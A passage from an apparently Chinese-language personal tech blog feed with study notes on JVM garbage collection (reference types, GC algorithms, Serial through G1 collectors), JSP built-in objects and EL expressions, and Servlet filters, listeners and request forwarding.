class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">byte</span>[] allocation1, allocation2,allocation3,allocation4,allocation5;</span><br><span class="line">allocation1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">32000</span>*<span class="number">1024</span>];</span><br><span class="line">allocation2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1000</span>*<span class="number">1024</span>];</span><br><span class="line">allocation3 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1000</span>*<span class="number">1024</span>];</span><br><span class="line">allocation4 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1000</span>*<span class="number">1024</span>];</span><br><span class="line">allocation5 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1000</span>*<span class="number">1024</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="大对象直接进入老年代"><a href="#大对象直接进入老年代" class="headerlink" title="大对象直接进入老年代"></a>大对象直接进入老年代</h3><p>大对象就是需要大量连续内存空间的对象（比如：字符串、数组）</p><p>为什么要这样呢？ </p><p>为了避免为大对象分配内存时由于分配担保机制带来的复制而降低效率 </p><h3 id="长期存活的对象将进入老年代"><a href="#长期存活的对象将进入老年代" class="headerlink" title="长期存活的对象将进入老年代"></a>长期存活的对象将进入老年代</h3><p>既然虚拟机采用了分带收集的思想来管理内存，那么内存回收时就必须能识别哪些对象应该放在新生代，哪些对象应放在老年代中。为了做到这一点，虚拟机给每个对象一个对象年龄（Age）计数器 </p><p>如果对象在Eden出生并经过第一次Minor GC 后任然能够存活，并且能被Survivor容纳的话，将被移动到Survivor空间中，并将对象年龄设为1，对象在Survivor中每熬过一次MinorGC，年龄就增加1 岁，当它的年龄增加到一定程度（默认为15岁），就会晋升到老年代中，对象晋升到老年代的年龄阈值，可以通过参数 <strong>-XX:MaxTenuringThreshold</strong> 来设置</p><h3 id="动态对象年龄判定"><a href="#动态对象年龄判定" class="headerlink" title="动态对象年龄判定"></a>动态对象年龄判定</h3><p>为了更好的适应不同程序的内存情况，虚拟机不是永远要求对象年龄必须达到某个值才能进入老年代，如果Survivor空间中相同年龄所有对象大小的总和大于Survivor 空间的一半， 年龄大于或等于该年龄的对象就可以直接进入老年代，无需达到要求的年龄。</p><h2 id="对象已经死亡？"><a href="#对象已经死亡？" class="headerlink" title="对象已经死亡？"></a>对象已经死亡？</h2><p>堆中几乎放着所有的对象实例，对堆垃圾回收前的第一步就是要判断那些对象已经死亡（即不能再被任何途径使用的对象）。</p><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210608230551214.png" alt="image-20210608230551214"></p><h3 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h3><p>给对象中添加一个引用计数器, 每当有一个地方引用它, 计数器就加1;     当引用失效,计数器就减1; 任何时候计数器为0的对象就是不可能再被使用的 .</p><p>这个方法实现简单, 效率高,但是目前主流的虚拟机中并没有选择这个算法来管理内存,其最主要的原因是它很难解决对象之间相互循环引用的问题. 所谓对象之间相互引用问题, 如下面代码所示: 除了对象objA 和 objB相互引用着对方之外, 这两个对象之间再无引用,但是他们因为互相引用对方,导致它们的的引用计数器都不为0, 于是引用计数算法无法通知GC对象回收他们.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceCountingGc</span> </span>&#123;</span><br><span class="line">    Object instance = <span class="keyword">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">ReferenceCountingGc objA = <span class="keyword">new</span> ReferenceCountingGc();</span><br><span class="line">ReferenceCountingGc objB = <span class="keyword">new</span> ReferenceCountingGc();</span><br><span class="line">objA.instance = objB;</span><br><span class="line">objB.instance = objA;</span><br><span class="line">objA = <span class="keyword">null</span>;</span><br><span class="line">objB = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可达性分析算法"><a href="#可达性分析算法" class="headerlink" title="可达性分析算法"></a>可达性分析算法</h3><p>这个算法的基本思想就是通过一系列的称为”GC Root” 的对象作为起点, 从这些结点开始向下搜索, 节点所走过的路径成为引用链,当一个对象到GC Roots 没有任何引用链相连的话,则证明此对象是不可用的 </p><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210609215258498.png" alt="image-20210609215258498"></p><h3 id="再谈引用"><a href="#再谈引用" class="headerlink" title="再谈引用"></a>再谈引用</h3><p>无论是通过引用计数法判断对象引用数量,还是通过可达性分析法判断对象的引用链是否可达, 判定对象的存活都与”引用” 有关</p><p>JDK1.2 之前,Java 中引用的定义很传统: 如果reference类别的数据存储的数值代表的是另一块内存的起始地址, 就称这块内存代表一个引用 </p><p>JDK1.2 之后,Java 对引用的概念进行了扩充, 将引用分为强引用、软引用、弱引用、虚引用四种（引用强度主键减弱） </p><ol><li>强引用 </li></ol><p>以前我们使用的大部分引用实际上都是强引用， 这是使用最普遍的引用。如果一个对象具有强引用，那就类似于<strong>必不可少的生活用品</strong>，垃圾回收器绝不会回收它。当内存空 间不足，Java虚拟机宁愿抛出OutOfMemoryError错误，使程序异常终止，也不会靠随意回收具有强引用的对象来解决内存不足问题。</p><ol start="2"><li><p>弱引用</p><p> 如果一个对象只具有弱引用, 那就类似于可有可无的生活用品, 弱引用与软引用的区别：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它 所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程， 因此不一定会很快发现那些只具有弱引用的对象。</p><p> 弱引用可以和一个引用队列(ReferenceQueue) 联合使用, 如果弱引用所引用的对象被垃圾回收，Java虚拟机就会把这个弱引用加入到与之关联的引用队列中。</p></li><li><p>软引用 </p><p> 如果一个对象只具有软引用, 那就类似于<strong>可有可无的生活用品</strong>。如果内存空间足够，垃圾回收器就不会回收它，如果内存空间不足了，就会回收这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高速缓存。</p><p> 软引用可以和一个引用队列（ReferenceQueue）联合使用，如果软引用所引用的对象被垃圾回收，JAVA虚拟机就会把这个软引用加入到与之关联的引用队列中。</p></li><li><p>虚引用 </p></li></ol><p>“虚引用”顾名思义，就是形同虚设，与其他几种引用都不同，虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收。</p><p><strong>虚引用主要用来跟踪对象被垃圾回收的活动</strong>。</p><p><strong>虚引用与软引用和弱引用的一个区别在于：</strong> 虚引用必须和引用队列（ReferenceQueue）联合使用。当垃 圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。程序可以通过判断引用队列中是 否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。程序如果发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取必要的行动。</p><p>特别注意，在程序设计中一般很少使用弱引用与虚引用，使用软引用的情况较多，这是因为<strong>软引用可以加速JVM对垃圾内存的回收速度，可以维护系统的运行安全，防止内存溢出（OutOfMemory）等问题的产生</strong>。</p><h3 id="不可达的对象并非-“非死不可”"><a href="#不可达的对象并非-“非死不可”" class="headerlink" title="不可达的对象并非 “非死不可”"></a>不可达的对象并非 “非死不可”</h3><p>即使在可达性分析法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑阶段”，要真正宣告一个对象死亡，至少要经历两次标记过程；可达性分析法中不可达的对象被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行 finalize 方法。当对象没有覆盖 finalize 方法，或 finalize 方法已经被虚拟机调用过时，虚拟机将这两种情况视为没有必要执行。</p><p>被判定为需要执行的对象将会被放在一个队列中进行第二次标记，除非这个对象与引用链上的任何一个对象建立关联，否则就会被真的回收。</p><h3 id="如何判断一个常量是废弃常量"><a href="#如何判断一个常量是废弃常量" class="headerlink" title="如何判断一个常量是废弃常量"></a>如何判断一个常量是废弃常量</h3><p>运行时常量池主要回收的是废弃的常量。那么，我们如何判断一个常量是废弃常量呢？</p><p>假如在常量池中存在字符串 “abc”，如果当前没有任何String对象引用该字符串常量的话，就说明常量 “abc” 就是废弃常量，如果这时发生内存回收的话而且有必要的话，”abc” 就会被系统清理出常量池。</p><p>注意：我们在 <a href="https://mp.weixin.qq.com/s?__biz=MzU4NDQ4MzU5OA==&mid=2247484303&idx=1&sn=af0fd436cef755463f59ee4dd0720cbd&chksm=fd9855eecaefdcf8d94ac581cfda4e16c8a730bda60c3b50bc55c124b92f23b6217f7f8e58d5&token=506869459&lang=zh_CN#rd" target="_blank" rel="noopener">可能是把Java内存区域讲的最清楚的一篇文章</a> 也讲了JDK1.7及之后版本的 JVM 已经将运行时常量池从方法区中移了出来，在 Java 堆（Heap）中开辟了一块区域存放运行时常量池。</p><h3 id="如何判断一个类是无用的类"><a href="#如何判断一个类是无用的类" class="headerlink" title="如何判断一个类是无用的类"></a>如何判断一个类是无用的类</h3><p>方法区主要回收的是无用的类，那么如何判断一个类是无用的类的呢？</p><p>判定一个常量是否是“废弃常量”比较简单，而要判定一个类是否是“无用的类”的条件则相对苛刻许多。类需要同时满足下面3个条件才能算是 <strong>“无用的类”</strong> ：</p><ul><li>该类所有的实例都已经被回收，也就是 Java 堆中不存在该类的任何实例。</li><li>加载该类的 ClassLoader 已经被回收。</li><li>该类对应的 java.lang.Class 对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。</li></ul><p>虚拟机可以对满足上述3个条件的无用类进行回收，这里说的仅仅是“可以”，而并不是和对象一样不使用了就会必然被回收。</p><h2 id="垃圾收集算法"><a href="#垃圾收集算法" class="headerlink" title="垃圾收集算法"></a>垃圾收集算法</h2><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210609231323136.png" alt="image-20210609231323136"></p><h3 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h3><p>算法分为“标记”和“清除”阶段：首先标记出所有需要回收的对象，在标记完成后统一回收所有被标记的对象。它是最基础的收集算法，效率也很高，但是会带来两个明显的问题：</p><ol><li><strong>效率问题</strong></li><li><strong>空间问题（标记清除后会产生大量不连续的碎片）</strong><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210609231346610.png" alt="image-20210609231346610"></li></ol><h3 id="复制算法"><a href="#复制算法" class="headerlink" title="复制算法"></a>复制算法</h3><p>为了解决效率问题，“复制”收集算法出现了。它可以将内存分为大小相同的两块，每次使用其中的一块。当这一块的内存使用完后，就将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉。这样就使每次的内存回收都是对内存区间的一半进行回收。<img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210609231415124.png" alt="image-20210609231415124"></p><h3 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h3><p>根据老年代的特点特出的一种标记算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象回收，而是让所有存活的对象向一端移动，然后直接清理掉端边界以外的内存。</p><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210609231459939.png" alt="image-20210609231459939"></p><h2 id="垃圾收集器"><a href="#垃圾收集器" class="headerlink" title="垃圾收集器"></a>垃圾收集器</h2><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210609231556344.png" alt="image-20210609231556344"></p><p><strong>如果说收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。</strong></p><p>虽然我们对各个收集器进行比较，但并非要挑选出一个最好的收集器。因为知道现在为止还没有最好的垃圾收集器出现，更加没有万能的垃圾收集器，<strong>我们能做的就是根据具体应用场景选择适合自己的垃圾收集器</strong>。试想一下：如果有一种四海之内、任何场景下都适用的完美收集器存在，那么我们的HotSpot虚拟机就不会实现那么多不同的垃圾收集器了。</p><h3 id="Serial收集器"><a href="#Serial收集器" class="headerlink" title="Serial收集器"></a>Serial收集器</h3><p>Serial（串行）收集器收集器是最基本、历史最悠久的垃圾收集器了。大家看名字就知道这个收集器是一个单线程收集器了。它的 <strong>“单线程”</strong> 的意义不仅仅意味着它只会使用一条垃圾收集线程去完成垃圾收集工作，更重要的是它在进行垃圾收集工作的时候必须暂停其他所有的工作线程（ <strong>“Stop The World”</strong> ），直到它收集结束。</p><p><strong>新生代采用复制算法，老年代采用标记-整理算法。</strong></p><p><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210609231617699.png" alt="image-20210609231617699"></p><p>虚拟机的设计者们当然知道Stop The World带来的不良用户体验，所以在后续的垃圾收集器设计中停顿时间在不断缩短（仍然还有停顿，寻找最优秀的垃圾收集器的过程仍然在继续）。</p><p>但是Serial收集器有没有优于其他垃圾收集器的地方呢？当然有，它<strong>简单而高效（与其他收集器的单线程相比）</strong>。Serial收集器由于没有线程交互的开销，自然可以获得很高的单线程收集效率。Serial收集器对于运行在Client模式下的虚拟机来说是个不错的选择。</p><h3 id="ParNew收集器"><a href="#ParNew收集器" class="headerlink" title="ParNew收集器"></a>ParNew收集器</h3><p><strong>ParNew收集器其实就是Serial收集器的多线程版本，除了使用多线程进行垃圾收集外，其余行为（控制参数、收集算法、回收策略等等）和Serial收集器完全一样。</strong></p><p><strong>新生代采用复制算法，老年代采用标记-整理算法。</strong><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210609231716822.png" alt="image-20210609231716822"></p><p>它是许多运行在Server模式下的虚拟机的首要选择，除了Serial收集器外，只有它能与CMS收集器（真正意义上的并发收集器，后面会介绍到）配合工作。</p><p><strong>并行和并发概念补充：</strong></p><ul><li><strong>并行（Parallel）</strong> ：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。</li><li><strong>并发（Concurrent）</strong>：指用户线程与垃圾收集线程同时执行（但不一定是并行，可能会交替执行），用户程序在继续运行，而垃圾收集器运行在另一个CPU上。</li></ul><h3 id="Parllel-Scavenge收集器"><a href="#Parllel-Scavenge收集器" class="headerlink" title="Parllel Scavenge收集器"></a>Parllel Scavenge收集器</h3><p>Parallel Scavenge 收集器类似于ParNew 收集器,</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-XX</span><span class="selector-pseudo">:+UseParallerlGC</span> </span><br><span class="line">使用<span class="selector-tag">Parallel</span>收集器+老年代串行</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-XX</span><span class="selector-pseudo">:+UseParallerOldGC</span></span><br><span class="line">使用<span class="selector-tag">Parallel</span>收集器+老年代并行</span><br></pre></td></tr></table></figure><p>Parallel Scavenge收集器关注点是吞吐量(高效率的利用CPU)<strong>。CMS等垃圾收集器的关注点更多的是用户线程的停顿时间（提高用户体验）。所谓吞吐量就是CPU中用于运行用户代码的时间与CPU总消耗时间的比值。</strong> Parallel Scavenge收集器提供了很多参数供用户找到最合适的停顿时间或最大吞吐量，如果对于收集器运作不太了解的话，手工优化存在的话可以选择把内存管理优化交给虚拟机去完成也是一个不错的选择。</p><h3 id="Serial-Old-收集器"><a href="#Serial-Old-收集器" class="headerlink" title="Serial Old 收集器"></a>Serial Old 收集器</h3><p><strong>Serial收集器的老年代版本</strong>，它同样是一个单线程收集器。它主要有两大用途：一种用途是在JDK1.5以及以前的版本中与Parallel Scavenge收集器搭配使用，另一种用途是作为CMS收集器的后备方案。</p><h3 id="Parallel-Old-收集器"><a href="#Parallel-Old-收集器" class="headerlink" title="Parallel Old 收集器"></a>Parallel Old 收集器</h3><p><strong>Parallel Scavenge收集器的老年代版本</strong>。使用多线程和“标记-整理”算法。在注重吞吐量以及CPU资源的场合，都可以优先考虑 Parallel Scavenge收集器和Parallel Old收集器。</p><h3 id="CMS收集器"><a href="#CMS收集器" class="headerlink" title="CMS收集器"></a>CMS收集器</h3><p><strong>CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。它而非常符合在注重用户体验的应用上使用。</strong></p><p><strong>CMS（Concurrent Mark Sweep）收集器是HotSpot虚拟机第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作。</strong></p><p>从名字中的<strong>Mark Sweep</strong>这两个词可以看出，CMS收集器是一种 <strong>“标记-清除”算法</strong>实现的，它的运作过程相比于前面几种垃圾收集器来说更加复杂一些。整个过程分为四个步骤：</p><ul><li><strong>初始标记：</strong> 暂停所有的其他线程，并记录下直接与root相连的对象，速度很快 ；</li><li><strong>并发标记：</strong> 同时开启GC和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以GC线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。</li><li><strong>重新标记：</strong> 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短</li><li><strong>并发清除：</strong> 开启用户线程，同时GC线程开始对为标记的区域做清扫。</li><li><img src="../images/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/image-20210610133155513.png" alt="image-20210610133155513"></li></ul><p>从它的名字就可以看出它是一款优秀的垃圾收集器，主要优点：<strong>并发收集、低停顿</strong>。但是它有下面三个明显的缺点：</p><ul><li><strong>对CPU资源敏感；</strong></li><li><strong>无法处理浮动垃圾；</strong></li><li><strong>它使用的回收算法-“标记-清除”算法会导致收集结束时会有大量空间碎片产生。</strong></li></ul><h3 id="G1收集器"><a href="#G1收集器" class="headerlink" title="G1收集器"></a>G1收集器</h3><p><strong>G1 (Garbage-First)是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足GC停顿时间要求的同时,还具备高吞吐量性能特征.</strong></p><p><strong>G1 (Garbage-First)是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足GC停顿时间要求的同时,还具备高吞吐量性能特征.</strong></p><p>被视为JDK1.7中HotSpot虚拟机的一个重要进化特征。它具备一下特点：</p><ul><li><strong>并行与并发</strong>：G1能充分利用CPU、多核环境下的硬件优势，使用多个CPU（CPU或者CPU核心）来缩短Stop-The-World停顿时间。部分其他收集器原本需要停顿Java线程执行的GC动作，G1收集器仍然可以通过并发的方式让java程序继续执行。</li><li><strong>分代收集</strong>：虽然G1可以不需要其他收集器配合就能独立管理整个GC堆，但是还是保留了分代的概念。</li><li><strong>空间整合</strong>：与CMS的“标记–清理”算法不同，G1从整体来看是基于“标记整理”算法实现的收集器；从局部上来看是基于“复制”算法实现的。</li><li><strong>可预测的停顿</strong>：这是G1相对于CMS的另一个大优势，降低停顿时间是G1 和 CMS 共同的关注点，但G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为M毫秒的时间片段内。</li></ul><p>G1收集器的运作大致分为以下几个步骤：</p><ul><li><strong>初始标记</strong></li><li><strong>并发标记</strong></li><li><strong>最终标记</strong></li><li><strong>筛选回收</strong></li></ul><p><strong>G1收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的Region(这也就是它的名字Garbage-First的由来)</strong>。这种使用Region划分内存空间以及有优先级的区域回收方式，保证了GF收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/jsp</title>
      <link href="java/jsp/"/>
      <url>java/jsp/</url>
      
        <content type="html"><![CDATA[<h1 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h1><a id="more"></a><h2 id="knowledge"><a href="#knowledge" class="headerlink" title="knowledge"></a>knowledge</h2><p>Tomcat 访问任何的资源都是在访问Servlet</p><p>JSP第一次被访问时候会被编译为HttpJspPage类（该类是HttpServlet 的一个子类）</p><p>JSP本身就是一种Servlet ， jsp比serlvlet 更方便见简单的一个重要原因就是：内置了9个对象！</p><p>内置对象有：out、session、response、request、config、page、application、pageContext、exception</p><h3 id="out-print-out-write"><a href="#out-print-out-write" class="headerlink" title="out.print() out.write()"></a>out.print() out.write()</h3><p>out.print(97) 打印的<strong>97</strong>都为字符串， </p><p>out.wite(97)打印的为ASCII表中的字符a</p><h3 id="getParameter"><a href="#getParameter" class="headerlink" title="getParameter"></a>getParameter</h3><p>getParameter得到的都是String类型的。或者是用于读取提交的表单中的值（<a href="http://a.jsp?id=123中的123），或者是某个表单提交过去的数据；" target="_blank" rel="noopener">http://a.jsp?id=123中的123），或者是某个表单提交过去的数据；</a><br>getAttribute则可以是对象Object，需进行转换,可用setAttribute设置成任意对象，使用很灵活，可随时用；</p><p>setAttribute 是应用服务器把这个对象放在该页面所对应的一块内存中去，当你的页面服务器重定向到另一个页面时，应用服务器会把这块内存拷贝另一个页面所对应的内存中。这样getAttribute就能取得你所设下的值，当然这种方法可以传对象。session也一样，只是对象在内存中的生命周期不一样而已。<br>getParameter只是应用服务器在分析你送上来的request页面的文本时，取得你设在表单或url重定向时的值。 </p><h3 id="jsp-getProperty"><a href="#jsp-getProperty" class="headerlink" title="jsp:getProperty"></a>jsp:getProperty</h3><p><a href="http://www.51gjie.com/javaweb/839.html" target="_blank" rel="noopener">jsp:getProperty</a></p><h2 id="El表达式"><a href="#El表达式" class="headerlink" title="El表达式"></a>El表达式</h2><p><a href="https://blog.csdn.net/meiyalei/article/details/2127738?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=1328767.81997.16177741380994275&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control" target="_blank" rel="noopener">参考</a></p><p>为了使jsp写起来更简单</p><pre><code>表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法。它是一种简单的语言，基于可用的命名空间（PageContext 属性）、嵌套属性和对集合、操作符（算术型、关系型和逻辑型）的访问符、映射到 Java 类中静态方法的可扩展函数以及一组隐式对象。</code></pre><p>语法结构</p><p>${expression}</p><p>1、语法结构<br>     ${expression}<br>2、[ ]与.运算符<br>     EL 提供“.“和“[ ]“两种运算符来存取数据。<br>     当要存取的属性名称中包含一些特殊字符，如.或?等并非字母或数字的符号，就一定要使用“[ ]“。例如：<br>         ${user.My-Name}应当改为${user[“My-Name”] }<br>     如果要动态取值时，就可以用“[ ]“来做，而“.“无法做到动态取值。例如：<br>         ${sessionScope.user[data]}中data 是一个变量<br>3、变量<br>     EL存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。<br>     因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。<br>     假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传null。<br>     属性范围在EL中的名称<br>         Page          PageScope<br>         Request          RequestScope<br>         Session          SessionScope<br>         Application      ApplicationScope</p><p>${ pageContext.request.contextPath} 取出部署应用程序的名字</p><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>&lt;jsp:forward page:”Relative URL”&gt;</p><h3 id="bean实例化"><a href="#bean实例化" class="headerlink" title="bean实例化"></a>bean实例化</h3><p>&lt;jsp:useBean id=”instanceName” sope=”page | request | session | application”</p><p>class= “packageName.className” type=”packageName.className”</p><p>beanName=”packageName.clssName | &lt;%=expression&gt;”/&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/Java异步</title>
      <link href="java/Java%E5%BC%82%E6%AD%A5/"/>
      <url>java/Java%E5%BC%82%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="java-异步请求"><a href="#java-异步请求" class="headerlink" title="java 异步请求"></a>java 异步请求</h1><p>马上开始写</p><a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/java_web</title>
      <link href="java/java_web/"/>
      <url>java/java_web/</url>
      
        <content type="html"><![CDATA[<h1 id="后端开发之路"><a href="#后端开发之路" class="headerlink" title="后端开发之路"></a>后端开发之路</h1><a id="more"></a><p>[TOC]</p><h2 id="Servlet-基础"><a href="#Servlet-基础" class="headerlink" title="Servlet 基础"></a>Servlet 基础</h2><p>Servlet规范描述了Http请求以及响应处理过程相关的对象及其作用。</p><h3 id="Servlet-过滤器"><a href="#Servlet-过滤器" class="headerlink" title="Servlet 过滤器"></a>Servlet 过滤器</h3><p>为特定的URL请求添加过滤器，</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">``</span>filter<span class="string">``</span>&gt;</span><br><span class="line">  <span class="string">``</span>&lt;<span class="string">``</span>filter-name<span class="string">``</span>&gt;LoggingFilter&lt;/<span class="string">``</span>filter-name<span class="string">``</span>&gt;</span><br><span class="line">  <span class="string">``</span>&lt;<span class="string">``</span>filter-<span class="keyword">class</span><span class="string">``</span>&gt;LoggingFilter&lt;/<span class="string">``</span>filter-<span class="keyword">class</span><span class="string">``</span>&gt;</span><br><span class="line">&lt;/<span class="string">``</span>filter<span class="string">``</span>&gt;</span><br><span class="line">&lt;<span class="string">``</span>filter-mapping<span class="string">``</span>&gt;</span><br><span class="line">  <span class="string">``</span>&lt;<span class="string">``</span>filter-name<span class="string">``</span>&gt;LogingFilter&lt;/<span class="string">``</span>filter-name<span class="string">``</span>&gt;</span><br><span class="line">  <span class="string">``</span>&lt;<span class="string">``</span>url-pattern<span class="string">``</span>&gt;<span class="comment">/*&lt;/``url-pattern``&gt;</span></span><br><span class="line"><span class="comment">&lt;/filter-mapping``&gt;</span></span><br></pre></td></tr></table></figure><h3 id="侦听Servlet容器事件"><a href="#侦听Servlet容器事件" class="headerlink" title="侦听Servlet容器事件"></a>侦听Servlet容器事件</h3><p>创建一个基于容器事件执行操作的侦听器，必须开发一个实现该ServletContextListemer接口的类。</p><p>需要实现的方法是contextInitialized()和contextDestoryed()</p><p>要向容器注册侦听器，可以使用以下技术之一：</p><p>1）利用<code>@WebListener</code>注释。<br>2）在web.xml应用程序部署描述符中注册侦听器。<br>3）使用上<code>addListener()</code>定义的方法<code>ServletContext</code>。</p><p>请注意，<code>ServletContextListener</code>它不是Servlet API中的唯一列表器。还有更多例如</p><ul><li>javax.servlet.ServletRequestListener</li><li>javax.servlet.ServletRequestAttrbiteListener</li><li>javax.servlet.ServletContextListener</li><li>javax.servlet.ServletContextAttributeListener</li><li>javax.servlet.HttpSessionListener</li><li>javax.servlet.HttpSessionAttributeListener</li></ul><p>可以由列表器类根据想听事件的类型来选择实现，HttpSessionListenser每次创建或销毁新用户会话时，都会收到通知</p><h3 id="将请求转发到另一个Servlet"><a href="#将请求转发到另一个Servlet" class="headerlink" title="将请求转发到另一个Servlet"></a>将请求转发到另一个Servlet</h3><h4 id="使用RequestDispatcher-forward"><a href="#使用RequestDispatcher-forward" class="headerlink" title="使用RequestDispatcher.forward()"></a>使用RequestDispatcher.forward()</h4><p>有时，您的应用程序要求servlet应该将请求移交给其他servlet，以完成需要完成的任务。此外，应在不将客户端重定向到另一个URL的情况下移交请求，即浏览器中的URL不应更改。</p><p>这样做的功能就内置在中<code>ServletContext</code>，因此一旦获得对的引用<code>ServletContext</code>，则只需调用该<code>getRequestDispatcher()</code>方法即可获得一个RequestDispatcher对象，该对象可用于调度请求。调用该<code>getRequestDispatcher()</code>方法时，传递一个String，其中包含要将您的请求传递到的servlet的名称。<code>RequestDispatcher</code>获取对象后，通过将<code>HttpServletRequest</code>和<code>HttpServletResponse</code>对象传递给它来调用其前向方法。转发方法执行移交请求的任务。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RequestDispatcher rd = servletContext.getRequestDispatcher(<span class="string">"/NextServlet"</span>);</span><br><span class="line">rd.forward(request,response);</span><br></pre></td></tr></table></figure><h4 id="使用HttpServletResponse-sendRedirect"><a href="#使用HttpServletResponse-sendRedirect" class="headerlink" title="使用HttpServletResponse.sendRedirect()"></a>使用HttpServletResponse.sendRedirect()</h4><p>当您访问应用程序中的特定URL时，想将浏览器重定向到另一个URL。 </p><p>为此，将需要调用HttpServletResponse object的sendRedirect()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpServletResponse,sendredirect(<span 